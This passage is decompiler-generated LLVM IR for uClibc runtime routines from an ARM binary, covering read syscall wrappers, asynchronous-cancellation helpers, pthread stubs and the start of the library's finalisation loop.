  br i1 %v2_15858, label %dec_label_pc_15860, label %entry.dec_label_pc_1587c_crit_edge

entry.dec_label_pc_1587c_crit_edge:               ; preds = %entry
  %v3_1587c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1587c

dec_label_pc_15860:                               ; preds = %entry
  %v0_15870 = load i32, i32* @r0, align 4
  %v2_15870 = icmp ugt i32 %v0_15870, -4097
  %v7_15870 = icmp eq i32 %v0_15870, -4096
  store i1 %v7_15870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15870, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1587c, %dec_label_pc_15860
  %merge = phi i32 [ %v0_15870, %dec_label_pc_15860 ], [ %v0_158a0, %dec_label_pc_1587c ], [ %v0_158b0, %bb10 ], [ %v6_158c0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_15860
  %v0_15878 = call i32 @__syscall_error()
  br label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %entry.dec_label_pc_1587c_crit_edge, %bb9
  %v3_1587c = phi i32 [ %v3_1587c.pre, %entry.dec_label_pc_1587c_crit_edge ], [ %v0_15878, %bb9 ]
  %v12_1587c = load i32, i32* @r3, align 4
  %v15_1587c = load i32, i32* @r7, align 4
  store i32 %v15_1587c, i32* %stack_var_-8, align 4
  %v18_1587c = load i32, i32* @lr, align 4
  %v0_15880 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_1587c, i32* @r3, align 4
  store i32 %v3_1587c, i32* @r7, align 4
  %v1_1589c = call i32 @__libc_disable_asynccancel(i32 %v0_15880)
  %v0_158a0 = load i32, i32* @r7, align 4
  store i32 %v0_158a0, i32* @r0, align 4
  %v2_158a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_158a4, i32* @r7, align 4
  store i32 %v18_1587c, i32* @lr, align 4
  %v2_158a8 = icmp ugt i32 %v0_158a0, -4097
  %v7_158a8 = icmp eq i32 %v0_158a0, -4096
  store i1 %v7_158a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158a8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1587c
  %v0_158b0 = call i32 @__syscall_error()
  %v0_158c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_158c0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_158c0 = load i32, i32* @r1, align 4
  %v2_158c0 = load i32, i32* @r8, align 4
  %v5_158c0 = sdiv i32 %v2_158c0, 134217728
  %v6_158c0 = and i32 %v5_158c0, %v1_158c0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_158a0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15870, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1587c, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_158d4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_158d4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_158d4 = load i32, i32* @r0, align 4
  ret i32 %v2_158d4

bb1:                                              ; preds = %entry
  %v0_158d8 = call i32 @__syscall_error()
  ret i32 %v0_158d8

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_158e4 = load i32, i32* @global_var_266b4.676, align 4
  %v2_158e8 = icmp eq i32 %v3_158e4, 0
  br i1 %v2_158e8, label %dec_label_pc_158f0, label %entry.dec_label_pc_1590c_crit_edge

entry.dec_label_pc_1590c_crit_edge:               ; preds = %entry
  %v3_1590c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1590c

dec_label_pc_158f0:                               ; preds = %entry
  %v0_15900 = load i32, i32* @r0, align 4
  %v2_15900 = icmp ugt i32 %v0_15900, -4097
  br i1 %v2_15900, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1590c, %dec_label_pc_158f0
  %merge = phi i32 [ %v0_15900, %dec_label_pc_158f0 ], [ %v0_15930, %dec_label_pc_1590c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_158f0
  %v0_15908 = call i32 @__syscall_error()
  br label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %entry.dec_label_pc_1590c_crit_edge, %bb8
  %v3_1590c = phi i32 [ %v3_1590c.pre, %entry.dec_label_pc_1590c_crit_edge ], [ %v0_15908, %bb8 ]
  %v6_1590c = load i32, i32* @r1, align 4
  %v15_1590c = load i32, i32* @r7, align 4
  store i32 %v15_1590c, i32* %stack_var_-8, align 4
  %v18_1590c = load i32, i32* @lr, align 4
  %v0_15910 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_1590c, i32* @r1, align 4
  store i32 %v3_1590c, i32* @r7, align 4
  %v1_1592c = call i32 @__libc_disable_asynccancel(i32 %v0_15910)
  %v0_15930 = load i32, i32* @r7, align 4
  store i32 %v0_15930, i32* @r0, align 4
  %v2_15934 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15934, i32* @r7, align 4
  store i32 %v18_1590c, i32* @lr, align 4
  %v2_15938 = icmp ugt i32 %v0_15930, -4097
  br i1 %v2_15938, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1590c
  %v0_15940 = call i32 @__syscall_error()
  ret i32 %v0_15940

; uselistorder directives
  uselistorder i32 %v0_15930, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_1590c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_15950 = load i32, i32* %r0.global-to-local, align 4
  %v1_15950 = and i32 %v0_15950, 2
  %v2_15950 = icmp eq i32 %v1_15950, 0
  %v3_15954 = load i32, i32* @r4, align 4
  store i32 %v3_15954, i32* %stack_var_-16, align 4
  br i1 %v2_15950, label %dec_label_pc_1595c, label %dec_label_pc_159d0

dec_label_pc_1595c:                               ; preds = %entry
  %v0_1595c = call i32 @__aeabi_read_tp()
  store i32 %v0_1595c, i32* %r0.global-to-local, align 4
  %v1_15960 = add i32 %v0_1595c, -1036
  %v2_15960 = inttoptr i32 %v1_15960 to i32*
  %v3_15960 = load i32, i32* %v2_15960, align 4
  %v1_15964 = add i32 %v0_1595c, -1168
  store i32 %v1_15964, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15968

dec_label_pc_15968:                               ; preds = %dec_label_pc_1599c.dec_label_pc_15968_crit_edge, %dec_label_pc_1595c
  %v0_15974 = phi i32 [ %v0_15974.pre, %dec_label_pc_1599c.dec_label_pc_15968_crit_edge ], [ %v1_15964, %dec_label_pc_1595c ]
  %v0_15968 = phi i32 [ %v0_1599c, %dec_label_pc_1599c.dec_label_pc_15968_crit_edge ], [ %v3_15960, %dec_label_pc_1595c ]
  %v1_15968 = and i32 %v0_15968, -3
  store i32 %v1_15968, i32* %r7.global-to-local, align 4
  store i32 %v0_15968, i32* %r4.global-to-local, align 4
  store i32 %v1_15968, i32* @r1, align 4
  %v1_15974 = add i32 %v0_15974, 132
  store i32 %v1_15974, i32* @r2, align 4
  %v1_1597823 = inttoptr i32 %v1_15974 to i32*
  %v2_1597824 = load i32, i32* %v1_1597823, align 4
  %v3_1597c26 = icmp uge i32 %v2_1597824, %v0_15968
  store i1 %v3_1597c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1597c32 = icmp eq i32 %v2_1597824, %v0_15968
  br i1 %v9_1597c32, label %dec_label_pc_15984, label %dec_label_pc_1599c

dec_label_pc_15984:                               ; preds = %dec_label_pc_15968, %dec_label_pc_15984.dec_label_pc_15978_crit_edge
  %v0_1598433 = phi i32 [ %v1_1597c.pre, %dec_label_pc_15984.dec_label_pc_15978_crit_edge ], [ %v0_15968, %dec_label_pc_15968 ]
  store i32 %v0_1598433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15994 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15994, label %dec_label_pc_15998, label %dec_label_pc_15984.dec_label_pc_15978_crit_edge

dec_label_pc_15984.dec_label_pc_15978_crit_edge:  ; preds = %dec_label_pc_15984
  %v0_15978.pre = load i32, i32* @r2, align 4
  %v1_1597c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15978 = inttoptr i32 %v0_15978.pre to i32*
  %v2_15978 = load i32, i32* %v1_15978, align 4
  %v3_1597c = icmp uge i32 %v2_15978, %v1_1597c.pre
  store i1 %v3_1597c, i1* %cpsr_c.global-to-local, align 1
  %v9_1597c = icmp eq i32 %v2_15978, %v1_1597c.pre
  br i1 %v9_1597c, label %dec_label_pc_15984, label %dec_label_pc_1599c

dec_label_pc_15998:                               ; preds = %dec_label_pc_15984
  %v0_15998 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1599c

dec_label_pc_1599c:                               ; preds = %dec_label_pc_15968, %dec_label_pc_15984.dec_label_pc_15978_crit_edge, %dec_label_pc_15998
  %v0_1599c = phi i32 [ %v0_15998, %dec_label_pc_15998 ], [ %v2_1597824, %dec_label_pc_15968 ], [ %v2_15978, %dec_label_pc_15984.dec_label_pc_15978_crit_edge ]
  %v1_1599c = phi i32 [ %v0_15998, %dec_label_pc_15998 ], [ %v0_15968, %dec_label_pc_15968 ], [ %v1_1597c.pre, %dec_label_pc_15984.dec_label_pc_15978_crit_edge ]
  %v3_1599c = icmp uge i32 %v0_1599c, %v1_1599c
  store i1 %v3_1599c, i1* %cpsr_c.global-to-local, align 1
  %v9_1599c = icmp eq i32 %v0_1599c, %v1_1599c
  br i1 %v9_1599c, label %dec_label_pc_159c4.preheader, label %dec_label_pc_1599c.dec_label_pc_15968_crit_edge

dec_label_pc_1599c.dec_label_pc_15968_crit_edge:  ; preds = %dec_label_pc_1599c
  %v0_15974.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15968

dec_label_pc_159c4.preheader:                     ; preds = %dec_label_pc_1599c
  %v0_159c41 = load i32, i32* %r7.global-to-local, align 4
  %v1_159c42 = and i32 %v0_159c41, 12
  store i32 %v1_159c42, i32* @r3, align 4
  %v2_159c83 = icmp ugt i32 %v1_159c42, 3
  store i1 %v2_159c83, i1* %cpsr_c.global-to-local, align 1
  %v7_159c85 = icmp eq i32 %v1_159c42, 4
  br i1 %v7_159c85, label %dec_label_pc_159a8.lr.ph, label %dec_label_pc_159c4.preheader.dec_label_pc_159d0.loopexit_crit_edge

dec_label_pc_159c4.preheader.dec_label_pc_159d0.loopexit_crit_edge: ; preds = %dec_label_pc_159c4.preheader
  %v1_159d4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159d0.loopexit

dec_label_pc_159a8.lr.ph:                         ; preds = %dec_label_pc_159c4.preheader
  %v0_159ac.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_159ac = add i32 %v0_159ac.pre, 132
  %v2_159c0 = inttoptr i32 %v1_159ac to i32*
  br label %dec_label_pc_159a8

dec_label_pc_159a8:                               ; preds = %dec_label_pc_159a8.lr.ph, %dec_label_pc_159a8
  %v0_159a8 = phi i32 [ %v0_159c41, %dec_label_pc_159a8.lr.ph ], [ %v3_159c0, %dec_label_pc_159a8 ]
  store i32 %v0_159a8, i32* @r2, align 4
  store i32 %v1_159ac, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_159c0 = load i32, i32* %v2_159c0, align 4
  store i32 %v3_159c0, i32* %r7.global-to-local, align 4
  %v1_159c4 = and i32 %v3_159c0, 12
  store i32 %v1_159c4, i32* @r3, align 4
  %v7_159c8 = icmp eq i32 %v1_159c4, 4
  br i1 %v7_159c8, label %dec_label_pc_159a8, label %dec_label_pc_159c4.dec_label_pc_159d0.loopexit_crit_edge

dec_label_pc_159c4.dec_label_pc_159d0.loopexit_crit_edge: ; preds = %dec_label_pc_159a8
  %v2_159c8 = icmp ugt i32 %v1_159c4, 3
  store i1 %v2_159c8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_159d0.loopexit

dec_label_pc_159d0.loopexit:                      ; preds = %dec_label_pc_159c4.preheader.dec_label_pc_159d0.loopexit_crit_edge, %dec_label_pc_159c4.dec_label_pc_159d0.loopexit_crit_edge
  %v1_159d4.pre = phi i32 [ %v1_159d4.pre.pre, %dec_label_pc_159c4.preheader.dec_label_pc_159d0.loopexit_crit_edge ], [ %v1_159ac, %dec_label_pc_159c4.dec_label_pc_159d0.loopexit_crit_edge ]
  %v2_159d0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_159d0

dec_label_pc_159d0:                               ; preds = %dec_label_pc_159d0.loopexit, %entry
  %v1_159d4 = phi i32 [ %v1_159d4.pre, %dec_label_pc_159d0.loopexit ], [ %v0_15950, %entry ]
  %v2_159d0 = phi i32 [ %v2_159d0.pre, %dec_label_pc_159d0.loopexit ], [ %v3_15954, %entry ]
  store i32 %v2_159d0, i32* @r4, align 4
  ret i32 %v1_159d4

; uselistorder directives
  uselistorder i32 %v3_159c0, { 1, 2, 0 }
  uselistorder i32 %v1_159ac, { 0, 2, 1 }
  uselistorder i32 %v0_15998, { 1, 0 }
  uselistorder i32 %v1_1597c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15968, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_159d0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_159a8, { 1, 0 }
  uselistorder label %dec_label_pc_1599c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15984, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_159d8 = load i32, i32* @r4, align 4
  store i32 %v3_159d8, i32* %stack_var_-24, align 4
  store i32 55768, i32* %r8.global-to-local, align 4
  %v0_159e0 = call i32 @__aeabi_read_tp()
  %v1_159e4 = add i32 %v0_159e0, -1036
  %v2_159e4 = inttoptr i32 %v1_159e4 to i32*
  %v3_159e4 = load i32, i32* %v2_159e4, align 4
  store i32 %v3_159e4, i32* %r6.global-to-local, align 4
  %v1_159e8 = add i32 %v0_159e0, -1168
  store i32 %v1_159e8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r8.global-to-local, align 4
  %v1_159f046 = or i32 %v3_159e4, 2
  store i32 %v1_159f046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_159f449 = icmp eq i32 %v1_159f046, %v3_159e4
  br i1 %v9_159f449, label %dec_label_pc_15aa0, label %dec_label_pc_159fc

dec_label_pc_159fc:                               ; preds = %entry, %bb.dec_label_pc_159fc_crit_edge
  %v0_15a00 = phi i32 [ %v0_15a00.pre, %bb.dec_label_pc_159fc_crit_edge ], [ %v1_159e8, %entry ]
  %v1_159f051 = phi i32 [ %v1_159f0, %bb.dec_label_pc_159fc_crit_edge ], [ %v1_159f046, %entry ]
  %v0_15a0450 = phi i32 [ %v1_15a30, %bb.dec_label_pc_159fc_crit_edge ], [ %v3_159e4, %entry ]
  store i32 %v1_159f051, i32* @r1, align 4
  %v1_15a00 = add i32 %v0_15a00, 132
  store i32 %v1_15a00, i32* %r2.global-to-local, align 4
  store i32 %v0_15a0450, i32* %r4.global-to-local, align 4
  %v1_15a0834 = inttoptr i32 %v1_15a00 to i32*
  %v2_15a0835 = load i32, i32* %v1_15a0834, align 4
  store i32 %v2_15a0835, i32* @r3, align 4
  %v3_15a0c37 = icmp uge i32 %v2_15a0835, %v0_15a0450
  store i1 %v3_15a0c37, i1* %cpsr_c.global-to-local, align 1
  %v9_15a0c43 = icmp eq i32 %v2_15a0835, %v0_15a0450
  br i1 %v9_15a0c43, label %dec_label_pc_15a14, label %dec_label_pc_15a2c

dec_label_pc_15a14:                               ; preds = %dec_label_pc_159fc, %dec_label_pc_15a14.dec_label_pc_15a08_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15a24 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a24, label %dec_label_pc_15a28, label %dec_label_pc_15a14.dec_label_pc_15a08_crit_edge

dec_label_pc_15a14.dec_label_pc_15a08_crit_edge:  ; preds = %dec_label_pc_15a14
  %v0_15a08.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15a0c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a08 = inttoptr i32 %v0_15a08.pre to i32*
  %v2_15a08 = load i32, i32* %v1_15a08, align 4
  store i32 %v2_15a08, i32* @r3, align 4
  %v3_15a0c = icmp uge i32 %v2_15a08, %v1_15a0c.pre
  store i1 %v3_15a0c, i1* %cpsr_c.global-to-local, align 1
  %v9_15a0c = icmp eq i32 %v2_15a08, %v1_15a0c.pre
  br i1 %v9_15a0c, label %dec_label_pc_15a14, label %dec_label_pc_15a2c

dec_label_pc_15a28:                               ; preds = %dec_label_pc_15a14
  %v0_15a28 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15a28, i32* @r3, align 4
  br label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_159fc, %dec_label_pc_15a14.dec_label_pc_15a08_crit_edge, %dec_label_pc_15a28
  %v1_15a30 = phi i32 [ %v0_15a28, %dec_label_pc_15a28 ], [ %v2_15a0835, %dec_label_pc_159fc ], [ %v2_15a08, %dec_label_pc_15a14.dec_label_pc_15a08_crit_edge ]
  %v1_15a2c = load i32, i32* %r6.global-to-local, align 4
  %v3_15a2c = icmp uge i32 %v1_15a30, %v1_15a2c
  store i1 %v3_15a2c, i1* %cpsr_c.global-to-local, align 1
  %v9_15a2c = icmp eq i32 %v1_15a30, %v1_15a2c
  br i1 %v9_15a2c, label %dec_label_pc_15a38, label %bb

bb:                                               ; preds = %dec_label_pc_15a2c
  store i32 %v1_15a30, i32* %r6.global-to-local, align 4
  %v1_159f0 = or i32 %v1_15a30, 2
  store i32 %v1_159f0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_159f4 = icmp eq i32 %v1_159f0, %v1_15a30
  br i1 %v9_159f4, label %dec_label_pc_15aa0, label %bb.dec_label_pc_159fc_crit_edge

bb.dec_label_pc_159fc_crit_edge:                  ; preds = %bb
  %v0_15a00.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_159fc

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a2c
  %v0_15a38 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a38 = and i32 %v0_15a38, -69
  store i32 %v1_15a38, i32* @r3, align 4
  %v2_15a3c = icmp ugt i32 %v1_15a38, 9
  store i1 %v2_15a3c, i1* %cpsr_c.global-to-local, align 1
  %v7_15a3c = icmp eq i32 %v1_15a38, 10
  br i1 %v7_15a3c, label %dec_label_pc_15a44, label %dec_label_pc_15aa0

dec_label_pc_15a44:                               ; preds = %dec_label_pc_15a38
  %v1_15a48 = load i32, i32* %r7.global-to-local, align 4
  %v2_15a48 = add i32 %v1_15a48, 544
  %v3_15a48 = inttoptr i32 %v2_15a48 to i32*
  store i32 -1, i32* %v3_15a48, align 4
  %v0_15a4c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_15a4c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a50

dec_label_pc_15a50:                               ; preds = %dec_label_pc_15a84.dec_label_pc_15a50_crit_edge, %dec_label_pc_15a44
  %v0_15a54 = phi i32 [ %v0_15a54.pre, %dec_label_pc_15a84.dec_label_pc_15a50_crit_edge ], [ %v0_15a4c, %dec_label_pc_15a44 ]
  %v0_15a50 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a50 = add i32 %v0_15a50, 132
  %v2_15a50 = inttoptr i32 %v1_15a50 to i32*
  %v3_15a50 = load i32, i32* %v2_15a50, align 4
  store i32 %v0_15a54, i32* %r2.global-to-local, align 4
  store i32 %v3_15a50, i32* %r4.global-to-local, align 4
  %v1_15a5c = or i32 %v3_15a50, 16
  store i32 %v1_15a5c, i32* @r1, align 4
  %v1_15a6022 = inttoptr i32 %v0_15a54 to i32*
  %v2_15a6023 = load i32, i32* %v1_15a6022, align 4
  %v3_15a6425 = icmp uge i32 %v2_15a6023, %v3_15a50
  store i1 %v3_15a6425, i1* %cpsr_c.global-to-local, align 1
  %v9_15a6431 = icmp eq i32 %v2_15a6023, %v3_15a50
  br i1 %v9_15a6431, label %dec_label_pc_15a6c, label %dec_label_pc_15a84

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15a50, %dec_label_pc_15a6c.dec_label_pc_15a60_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15a7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a7c, label %dec_label_pc_15a80, label %dec_label_pc_15a6c.dec_label_pc_15a60_crit_edge

dec_label_pc_15a6c.dec_label_pc_15a60_crit_edge:  ; preds = %dec_label_pc_15a6c
  %v0_15a60.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15a64.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a60 = inttoptr i32 %v0_15a60.pre to i32*
  %v2_15a60 = load i32, i32* %v1_15a60, align 4
  %v3_15a64 = icmp uge i32 %v2_15a60, %v1_15a64.pre
  store i1 %v3_15a64, i1* %cpsr_c.global-to-local, align 1
  %v9_15a64 = icmp eq i32 %v2_15a60, %v1_15a64.pre
  br i1 %v9_15a64, label %dec_label_pc_15a6c, label %dec_label_pc_15a84

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a6c
  %v0_15a80 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a84

dec_label_pc_15a84:                               ; preds = %dec_label_pc_15a50, %dec_label_pc_15a6c.dec_label_pc_15a60_crit_edge, %dec_label_pc_15a80
  %v0_15a84 = phi i32 [ %v0_15a80, %dec_label_pc_15a80 ], [ %v2_15a6023, %dec_label_pc_15a50 ], [ %v2_15a60, %dec_label_pc_15a6c.dec_label_pc_15a60_crit_edge ]
  %v1_15a84 = phi i32 [ %v0_15a80, %dec_label_pc_15a80 ], [ %v3_15a50, %dec_label_pc_15a50 ], [ %v1_15a64.pre, %dec_label_pc_15a6c.dec_label_pc_15a60_crit_edge ]
  %v3_15a84 = icmp uge i32 %v0_15a84, %v1_15a84
  store i1 %v3_15a84, i1* %cpsr_c.global-to-local, align 1
  %v9_15a84 = icmp eq i32 %v0_15a84, %v1_15a84
  br i1 %v9_15a84, label %dec_label_pc_15a8c, label %dec_label_pc_15a84.dec_label_pc_15a50_crit_edge

dec_label_pc_15a84.dec_label_pc_15a50_crit_edge:  ; preds = %dec_label_pc_15a84
  %v0_15a54.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a50

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a84
  store i32 116, i32* @r3, align 4
  %v0_15a94 = load i32, i32* %r8.global-to-local, align 4
  %v2_15a94 = add i32 %v0_15a94, 116
  %v3_15a94 = inttoptr i32 %v2_15a94 to i32*
  %v4_15a94 = load i32, i32* %v3_15a94, align 4
  store i32 %v4_15a94, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_15a94)
  %v0_15aa0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %entry, %bb, %dec_label_pc_15a38, %dec_label_pc_15a8c
  %v0_15aa0 = phi i32 [ %v1_15a30, %dec_label_pc_15a38 ], [ %v0_15aa0.pre, %dec_label_pc_15a8c ], [ %v3_159e4, %entry ], [ %v1_15a30, %bb ]
  %v2_15aa4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15aa4, i32* @r4, align 4
  ret i32 %v0_15aa0

; uselistorder directives
  uselistorder i32 %v0_15a80, { 1, 0 }
  uselistorder i32 %v1_15a64.pre, { 0, 2, 1 }
  uselistorder i32 %v1_159f0, { 1, 2, 0 }
  uselistorder i32 %v1_15a2c, { 1, 0 }
  uselistorder i32 %v1_15a30, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_15a0c.pre, { 1, 0 }
  uselistorder i32 %v0_15a0450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15aa0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a6c, { 1, 0 }
  uselistorder label %dec_label_pc_15a2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a14, { 1, 0 }
  uselistorder label %dec_label_pc_159fc, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_15ac4 = add i32 %tmp, 4
  %v4_15ac4 = inttoptr i32 %v3_15ac4 to i32*
  store i32 %arg3, i32* %v4_15ac4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_15ad0 = icmp eq i32 %arg2, 0
  br i1 %v2_15ad0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_15adc = add i32 %tmp, 4
  %v3_15adc = inttoptr i32 %v2_15adc to i32*
  %v4_15adc = load i32, i32* %v3_15adc, align 4
  store i32 %v4_15adc, i32* %r0.global-to-local, align 4
  %v3_15ae0 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_15ae0, %bb ], [ undef, %entry ]
  %v2_15ae8 = xor i1 %v2_15ad0, true
  call void @__pseudo_cond_branch(i1 %v2_15ae8, i32 %.02)
  %v1_15af4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15af4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_15b1c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15af8 = load i32, i32* @r4, align 4
  store i32 %v3_15af8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b1c

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b1c.dec_label_pc_15b1c_crit_edge, %dec_label_pc_15b1c.lr.ph
  %v1_15b1c = phi i32 [ %v1_15b28, %dec_label_pc_15b1c.dec_label_pc_15b1c_crit_edge ], [ 0, %dec_label_pc_15b1c.lr.ph ]
  %v0_15b1c = phi i32 [ %v0_15b1c.pre, %dec_label_pc_15b1c.dec_label_pc_15b1c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -8), %dec_label_pc_15b1c.lr.ph ]
  %v4_15b1c = mul i32 %v1_15b1c, 4
  %v5_15b1c = add i32 %v4_15b1c, %v0_15b1c
  %v6_15b1c = inttoptr i32 %v5_15b1c to i32*
  %v7_15b1c = load i32, i32* %v6_15b1c, align 4
  call void @__pseudo_branch(i32 %v7_15b1c)
  %v0_15b28 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b28 = add i32 %v0_15b28, -1
  store i32 %v1_15b28, i32* %r4.global-to-local, align 4
  %v2_15b28 = icmp eq i32 %v0_15b28, 0
  br i1 %v2_15b28, label %dec_label_pc_15b30, label %dec_label_pc_15b1c.dec_label_pc_15b1c_crit_edge

